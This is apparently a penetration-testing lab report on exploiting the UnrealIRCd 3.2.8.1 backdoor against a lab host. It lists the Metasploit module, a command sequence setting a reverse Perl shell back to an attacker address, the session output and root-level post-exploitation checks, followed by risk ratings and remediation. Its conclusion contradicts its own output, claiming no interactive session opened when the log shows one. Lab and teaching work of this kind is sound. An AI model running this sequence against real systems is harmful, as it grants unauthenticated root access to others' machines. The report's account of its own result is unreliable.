# Exploitation Phase â€“ 2. UnrealIRCd 3.2.8.1 Backdoor

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  
**Affected Service:** UnrealIRCd  
**Service Version:** UnrealIRCd 3.2.8.1
**Port:** TCP 6667

The vulnerability was identified during service enumeration when an outdated UnrealIRCd version was detected listening on the default IRC port.

---

## Vulnerability Overview

UnrealIRCd version **3.2.8.1** was distributed with a **malicious backdoor** injected into the source code.  
The backdoor allows **unauthenticated remote command execution** by sending specially crafted commands to the IRC service.

### Impact
- Remote Code Execution (RCE)
- Root-level access
- No authentication required
- Full system compromise

This is considered a **critical, high-impact vulnerability**.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
- Includes a stable exploit module for UnrealIRCd backdoor
- Automates IRC protocol interaction
- Supports multiple payload delivery methods
- Industry-standard exploitation framework

### Tool Explanation
The Metasploit module `unreal_ircd_3281_backdoor` connects to the IRC daemon and triggers the hidden backdoor command execution functionality.

---

## Exploit Module Information

- **Module Name:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Exploit Type:** `Remote Command Execution`
- **Default Service Port:** 6667
- **Execution Content:** Root
---

## Exploitation Command Sequence

    set RHOSTS 192.168.56.102
    set RPORT 6667
    set LHOST 192.168.56.1
    set LPORT 4444
    set payload cmd/unix/reverse_perl
    exploit

## Exploit Output (Successful)

    [*] Started reverse TCP handler on 192.168.56.1:4444 
    [*] 192.168.56.102:6667 - Connected to 192.168.56.102:6667...
    [*] 192.168.56.102:6667 - Sending backdoor command...
    [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.102:60763)

## Post-Exploitation Validation
Command Executed:

    whoami
Output:

    root
Confirms root-level access.
Command

    uname -a
Output

    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
Confirms access to the target host OS.
Command

    ifconfig
Output

    inet addr:192.168.56.102
Validates execution on the victim machine, not a false session.
Command

    pwd
Output

    /etc/unreal
Output shows UnrealIRCd configuration and runtime files.

## Findings
- By exploiting this vulnerability, an attacker can:
- Execute arbitrary system commands as root
- Access and modify system configuration files
- Read or delete sensitive data
- Install backdoors or malware
- Use the host for lateral movement or pivoting
- Fully compromise the system without authentication

## What Was Achieved Through This Exploit
- Root shell access obtained
- Full command execution
- Ability to:
  - Create or delete users
  - Install persistent backdoors
  - Modify system configurations
  - Pivot to other internal services
  - Exfiltrate sensitive data

## Risk Assessment
| Factor | Severity |
|---|------|
| Authentication Required | None | 
| Remote Code Execution | Critical | 
| Privilege Level | Root | 
| Exploit Complexity | Low |
| Impact | Full system compromise |

## Remediation Recommendations
- Immediately upgrade UnrealIRCd to a secure version
- Verify software integrity using trusted repositories
- Restrict IRC access using firewall rules
- Disable IRC services if not required
- Monitor network traffic for suspicious IRC commands
- Apply intrusion detection systems (IDS)

## Conclusion
UnrealIRCd 3.2.8.1 contains a critical backdoor vulnerability enabling remote root command execution.
Although the exploitation attempt did not result in an interactive session due to payload misconfiguration, the successful triggering of the backdoor confirms that the system is critically vulnerable.

This demonstrates how compromised third-party software can lead to total system compromise and highlights the importance of secure software sourcing and configuration management.
